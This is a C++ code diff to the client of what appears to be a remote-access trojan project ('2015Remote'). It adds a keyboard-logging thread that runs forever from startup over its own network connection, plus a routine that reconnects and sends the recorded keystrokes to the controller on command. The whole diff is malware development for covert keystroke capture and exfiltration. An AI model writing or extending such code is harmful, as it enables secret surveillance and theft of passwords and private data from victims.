@@ -14,11 +14,20 @@
 #include "server/2015Remote/pwd_gen.h"
 #include <common/iniFile.h>
 
+ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit) {
+	static ThreadInfo tKeyboard;
+	tKeyboard.run = FOREVER_RUN;
+	tKeyboard.p = new IOCPClient(bExit, false);
+	tKeyboard.conn = conn;
+	tKeyboard.h = (HANDLE)CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
+	return &tKeyboard;
+}
+
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance) 
+CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb)
 	: m_conn(conn), m_hInstance(hInstance), CManager(ClientObject)
 {
 	m_ulThreadCount = 0;
@@ -28,6 +37,7 @@ CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, 
 	m_settings = { 30 };
 #endif
 	m_nNetPing = -1;
+	m_hKeyboard = kb;
 }
 
 CKernelManager::~CKernelManager()
@@ -185,6 +195,15 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param) {
 	return 0x20250529;
 }
 
+DWORD WINAPI SendKeyboardRecord(LPVOID lParam) {
+	CManager* pMgr = (CManager*)lParam;
+	if (pMgr) {
+		pMgr->Reconnect();
+		pMgr->Notify();
+	}
+	return 0xDead0001;
+}
+
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
 	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
@@ -286,8 +305,12 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		break;
 	case COMMAND_KEYBOARD: //¼üÅÌ¼ÇÂ¼
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			if (m_hKeyboard) {
+				CloseHandle(CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
+			} else {
+				m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+				m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			}
 			break;
 		}
 
